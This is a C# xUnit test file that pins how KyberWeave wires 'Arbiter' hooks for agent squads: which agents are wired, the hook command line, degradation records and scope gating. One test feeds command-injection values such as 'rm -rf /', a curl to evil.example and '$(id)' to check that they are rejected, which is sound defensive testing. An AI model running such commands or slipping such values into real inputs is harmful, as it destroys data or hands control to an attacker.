using System.Text;
using KyberWeave.Core.Squad.Deployment;
using KyberWeave.Core.Squad.Model;
using KyberWeave.Core.Squad.Parsing;
using KyberWeave.Core.Squad.Rendering;
using KyberWeave.Tests.Fixtures;
using Xunit;

namespace KyberWeave.Tests;

/// <summary>
/// Pins the Arbiter hook-wiring contract: which agents are dispatchers or guarded for a
/// loaded <see cref="SquadSource"/>, the exact hook command line and timeout, the target
/// data (<c>HookedTargets</c>, <c>FallbackTargets</c>, <c>TrustSteps</c>) from which
/// <c>arbiter-not-enforced</c> degradations are derived, the Enabled-and-Project gate on
/// hook production (Req 22.4), and that a request whose <c>Arbiter</c> wiring is null or
/// disabled renders byte for byte as before the field existed.
/// </summary>
public sealed class ArbiterHookWiringTests : IDisposable
{
    private static readonly string[] DispatcherAgents =
        [ArbiterSquadFixture.Conductor, ArbiterSquadFixture.Architect, ArbiterSquadFixture.ProductOwner, ArbiterSquadFixture.CodeReviewer];

    private static readonly string[] GuardedAgents =
        [ArbiterSquadFixture.CsharpDev, ArbiterSquadFixture.TestDev, ArbiterSquadFixture.GithubDevops];

    private static readonly string[] HookedTargetTokens = ["claude", "copilot", "opencode"];

    /// <summary>Declared independently of <see cref="ArbiterHookWiring"/> so a change to
    /// either side has to be made deliberately in both.</summary>
    private const string ExpectedCommandPrefix = "kyber-weave-arbiter hook --harness";

    private const string DegradationCode = "arbiter-not-enforced";

    private readonly ArbiterSquadFixture _fixture = ArbiterSquadFixture.Create();

    public void Dispose() => _fixture.Dispose();

    private SquadSource LoadedSource => SquadSourceLoader.Load(_fixture.Path);

    [Fact]
    public void Dispatchers_AreExactlyTheAgentsWithDelegations()
    {
        IReadOnlySet<string> dispatchers = ArbiterHookWiring.Dispatchers(LoadedSource);

        Assert.Equal(
            new HashSet<string>(DispatcherAgents, StringComparer.Ordinal),
            dispatchers);
    }

    [Fact]
    public void GuardedAgents_AreExactlyTheImplementationSpecialists()
    {
        IReadOnlySet<string> guarded = ArbiterHookWiring.GuardedAgents(LoadedSource);

        Assert.Equal(
            new HashSet<string>(GuardedAgents, StringComparer.Ordinal),
            guarded);
    }

    [Fact]
    public void GuardedAgents_NeverIncludeDocsDev()
    {
        // Req 25.3: docs-dev keeps unguarded document access. The fixture gives docs-dev a
        // dedicated profile, so this holds by profile membership rather than by a name carve-out.
        IReadOnlySet<string> guarded = ArbiterHookWiring.GuardedAgents(LoadedSource);

        Assert.DoesNotContain(ArbiterSquadFixture.DocsDev, guarded);
        Assert.DoesNotContain(ArbiterSquadFixture.ResearchAgent, guarded);
    }

    [Fact]
    public void HookCommandLine_PinsHarnessTokenAndCaller()
    {
        Assert.Equal(
            $"{ExpectedCommandPrefix} claude --caller {ArbiterSquadFixture.Conductor}",
            ArbiterHookWiring.HookCommandLine(SquadTarget.Claude, ArbiterSquadFixture.Conductor));
        Assert.Equal(
            $"{ExpectedCommandPrefix} copilot --caller {ArbiterSquadFixture.CsharpDev}",
            ArbiterHookWiring.HookCommandLine(SquadTarget.Copilot, ArbiterSquadFixture.CsharpDev));
        Assert.Equal(
            $"{ExpectedCommandPrefix} opencode --caller {ArbiterSquadFixture.TestDev}",
            ArbiterHookWiring.HookCommandLine(SquadTarget.OpenCode, ArbiterSquadFixture.TestDev));
    }

    [Theory]
    // A caller reaching the command line raw splits or injects: a space ends the
    // argument, and every shell metacharacter is the harness's to interpret.
    [InlineData("csharp dev")]
    [InlineData("csharp-dev; rm -rf /")]
    [InlineData("csharp-dev && curl evil.example")]
    [InlineData("`id`")]
    [InlineData("$(id)")]
    [InlineData("csharp-dev\n--harness evil")]
    [InlineData("-leading-dash")]
    [InlineData("")]
    [InlineData("   ")]
    public void HookCommandLine_RejectsACallerThatIsNotAPlainAgentName(string hostile)
    {
        ArgumentException error = Assert.Throws<ArgumentException>(
            () => ArbiterHookWiring.HookCommandLine("claude", hostile));

        Assert.Contains("caller", error.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    [InlineData("csharp-dev")]
    [InlineData("docs_dev")]
    [InlineData("a")]
    [InlineData("A0")]
    [InlineData("agent-with-many-dashes-and_underscores-9")]
    public void HookCommandLine_RendersAPlainAgentNameUnchanged(string caller)
    {
        Assert.Equal(
            $"{ExpectedCommandPrefix} claude --caller {caller}",
            ArbiterHookWiring.HookCommandLine("claude", caller));
    }

    [Fact]
    public void HookCommandLine_RejectsTheHostileCallerThroughTheTargetOverload()
    {
        // The SquadTarget overload is the second door into the same command line, so the
        // validation has to sit behind it rather than beside it.
        Assert.Throws<ArgumentException>(
            () => ArbiterHookWiring.HookCommandLine(SquadTarget.Claude, "csharp-dev; id"));
    }

    [Fact]
    public void HookedTargets_AreExactlyClaudeCopilotAndOpencode()
    {
        Assert.Equal(
            new HashSet<string>(HookedTargetTokens, StringComparer.Ordinal),
            ArbiterHookWiring.HookedTargets);
    }

    [Fact]
    public void FallbackTargets_AreEmptyUntilAFallbackTargetIsApproved()
    {
        // R7 keeps a placeholder for harnesses whose D4 marker fallback is advisory only.
        // No approved target holds that role today; the set must not silently grow.
        Assert.Empty(ArbiterHookWiring.FallbackTargets);
    }

    [Fact]
    public void TrustSteps_NameClaudeAndCopilotGates()
    {
        Assert.Equal(
            new HashSet<SquadTarget> { SquadTarget.Claude, SquadTarget.Copilot },
            ArbiterHookWiring.TrustSteps.Keys.ToHashSet());

        string claudeStep = ArbiterHookWiring.TrustSteps[SquadTarget.Claude];
        Assert.Contains("workspace trust", claudeStep, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("claude -p", claudeStep, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("frontmatter hook", claudeStep, StringComparison.OrdinalIgnoreCase);

        string copilotStep = ArbiterHookWiring.TrustSteps[SquadTarget.Copilot];
        Assert.Contains("trusted workspace", copilotStep, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("chat.useHooks", copilotStep, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void TargetDegradations_ProjectScope_LeavesHookedTargetsUnrecorded()
    {
        IReadOnlyList<SquadDegradationRecord> records = ArbiterHookWiring.TargetDegradations(
            [SquadTarget.Claude, SquadTarget.Copilot, SquadTarget.OpenCode],
            SquadDeploymentScope.Project);

        Assert.Empty(records);
    }

    [Fact]
    public void TargetDegradations_ProjectScope_RecordsNoHookSupportForUnhookedTargets()
    {
        List<SquadDegradationRecord> records = ArbiterHookWiring.TargetDegradations(
            [SquadTarget.Cursor, SquadTarget.Pi],
            SquadDeploymentScope.Project).ToList();

        Assert.Equal(2, records.Count);
        Assert.All(records, record => Assert.Equal(DegradationCode, record.Code));
        Assert.Equal(
            new HashSet<string> { "cursor", "pi" },
            records.Select(record => record.Target).ToHashSet());
        Assert.Contains(records, record =>
            record.Target == "cursor" &&
            record == new SquadDegradationRecord(
                "cursor", "arbiter", "arbiter", DegradationCode, string.Empty, "no-hook-support"));
        Assert.Contains(records, record =>
            record.Target == "pi" &&
            record == new SquadDegradationRecord(
                "pi", "arbiter", "arbiter", DegradationCode, string.Empty, "no-hook-support"));
    }

    [Fact]
    public void TargetDegradations_ClassifiesFallbackOnlyTargetsThroughTheTargetSets()
    {
        // FallbackTargets is empty today, so the fallback-only record kind is exercised
        // through the set-parameterized derivation the public method delegates to: it must
        // classify a fallback-set target as advisory-only (R7) and a hooked target as enforced.
        List<SquadDegradationRecord> records = ArbiterHookWiring.TargetDegradations(
            [SquadTarget.Warp, SquadTarget.Pi],
            SquadDeploymentScope.Project,
            hookedTargets: new HashSet<string>(StringComparer.Ordinal) { "warp" },
            fallbackTargets: new HashSet<string>(StringComparer.Ordinal) { "pi" }).ToList();

        Assert.Single(records);
        Assert.Equal(
            new SquadDegradationRecord(
                "pi", "arbiter", "arbiter", DegradationCode, string.Empty, "fallback-only"),
            records[0]);
    }

    [Fact]
    public void TargetDegradations_GlobalScope_RecordsGlobalScopeForEveryTarget()
    {
        // Req 22.4: a global install reads no project configuration, so even a hooked
        // target degrades — every requested target gets exactly the global-scope record.
        List<SquadDegradationRecord> records = ArbiterHookWiring.TargetDegradations(
            [SquadTarget.Claude, SquadTarget.Cursor],
            SquadDeploymentScope.Global).ToList();

        Assert.Equal(2, records.Count);
        Assert.All(records, record =>
        {
            Assert.Equal(DegradationCode, record.Code);
            Assert.Equal("global-scope", record.Details);
        });
        Assert.Equal(
            new HashSet<string> { "claude", "cursor" },
            records.Select(record => record.Target).ToHashSet());
    }

    [Fact]
    public void BuildHooks_WhenDisabled_ProducesNoHooks()
    {
        SquadArbiterWiring wiring = new(Enabled: false, HookTimeoutSeconds: 45);

        IReadOnlyList<SquadArbiterHook> hooks = ArbiterHookWiring.BuildHooks(
            LoadedSource, wiring, SquadDeploymentScope.Project);

        Assert.Empty(hooks);
    }

    [Fact]
    public void BuildHooks_EnabledUnderGlobalScope_ProducesNoHooks()
    {
        // Req 22.4: no hook is produced under Global scope even when wiring is enabled.
        SquadArbiterWiring wiring = new(Enabled: true, HookTimeoutSeconds: 45);

        IReadOnlyList<SquadArbiterHook> hooks = ArbiterHookWiring.BuildHooks(
            LoadedSource, wiring, SquadDeploymentScope.Global);

        Assert.Empty(hooks);
    }

    [Fact]
    public void BuildHooks_EnabledUnderProjectScope_WiresEveryDispatchedAndGuardedAgentOnEveryHookedTarget()
    {
        SquadArbiterWiring wiring = new(Enabled: true, HookTimeoutSeconds: 45);

        IReadOnlyList<SquadArbiterHook> hooks = ArbiterHookWiring.BuildHooks(
            LoadedSource, wiring, SquadDeploymentScope.Project);

        Assert.Equal(HookedTargetTokens.Length * (DispatcherAgents.Length + GuardedAgents.Length), hooks.Count);
        Assert.All(hooks, hook =>
        {
            Assert.Contains(hook.Target, HookedTargetTokens);
            Assert.Equal(wiring.HookTimeoutSeconds, hook.TimeoutSeconds);
            Assert.Equal(
                $"{ExpectedCommandPrefix} {hook.Target} --caller {hook.Caller}",
                hook.CommandLine);
        });

        HashSet<string> wiredPairs = hooks
            .Select(hook => $"{hook.Target}/{hook.Caller}")
            .ToHashSet(StringComparer.Ordinal);
        foreach (string token in HookedTargetTokens)
        {
            foreach (string agent in DispatcherAgents.Concat(GuardedAgents))
            {
                Assert.Contains($"{token}/{agent}", wiredPairs);
            }
        }

        // Neither the unguarded documentation agent nor the read-only research agent is wired.
        Assert.DoesNotContain(hooks, hook => hook.Caller == ArbiterSquadFixture.DocsDev);
        Assert.DoesNotContain(hooks, hook => hook.Caller == ArbiterSquadFixture.ResearchAgent);
    }

    [Fact]
    public async Task RenderAsync_DisabledArbiter_RendersByteForByteIdenticallyToOmittingIt()
    {
        SquadRendererRegistry registry = new([new ClaudeRenderer(), new OpenCodeRenderer()]);
        SquadRenderRequest withoutWiring = new(
            SourceDirectory: _fixture.Path,
            Targets: [SquadTarget.Claude, SquadTarget.OpenCode],
            Scope: SquadDeploymentScope.Project);
        SquadRenderRequest disabledWiring = new(
            SourceDirectory: _fixture.Path,
            Targets: [SquadTarget.Claude, SquadTarget.OpenCode],
            Scope: SquadDeploymentScope.Project,
            Arbiter: new SquadArbiterWiring(Enabled: false, HookTimeoutSeconds: 45));

        SquadRenderResult withoutResult = await registry.RenderAsync(withoutWiring);
        SquadRenderResult disabledResult = await registry.RenderAsync(disabledWiring);

        Assert.True(withoutResult.Success, string.Join("; ", withoutResult.Errors));
        Assert.True(disabledResult.Success, string.Join("; ", disabledResult.Errors));
        Assert.Equal(withoutResult.Errors, disabledResult.Errors);
        Assert.Equal(withoutResult.Warnings, disabledResult.Warnings);
        Assert.Equal(withoutResult.Degradations, disabledResult.Degradations);
        Assert.Equal(
            withoutResult.Files.Select(file => (file.Target, file.RelativePath)).Order().ToList(),
            disabledResult.Files.Select(file => (file.Target, file.RelativePath)).Order().ToList());
        foreach ((SquadDeploymentFile expected, SquadDeploymentFile actual) in withoutResult.Files
            .OrderBy(file => file.Target, StringComparer.Ordinal)
            .ThenBy(file => file.RelativePath, StringComparer.Ordinal)
            .Zip(disabledResult.Files
                .OrderBy(file => file.Target, StringComparer.Ordinal)
                .ThenBy(file => file.RelativePath, StringComparer.Ordinal)))
        {
            Assert.True(
                expected.Content.Span.SequenceEqual(actual.Content.Span),
                $"Rendered bytes differ for {actual.Target}/{actual.RelativePath} when the " +
                "Arbiter wiring is disabled; a disabled wiring must not change today's render.");
        }
    }
}
